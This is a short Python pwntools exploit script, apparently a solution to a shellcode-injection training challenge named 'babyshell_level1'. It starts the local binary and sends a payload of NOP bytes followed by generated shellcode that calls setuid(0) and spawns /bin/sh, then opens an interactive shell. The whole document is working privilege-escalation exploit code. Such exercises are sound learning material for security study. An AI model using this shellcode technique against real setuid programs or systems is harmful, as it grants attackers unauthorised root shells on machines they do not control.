from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

elf = ELF("./babyshell_level1")
p = process("./babyshell_level1")

payload = b"\x90"*10 + asm(shellcraft.setuid(0)) + asm(shellcraft.sh()) 

p.send(payload)

p.interactive()
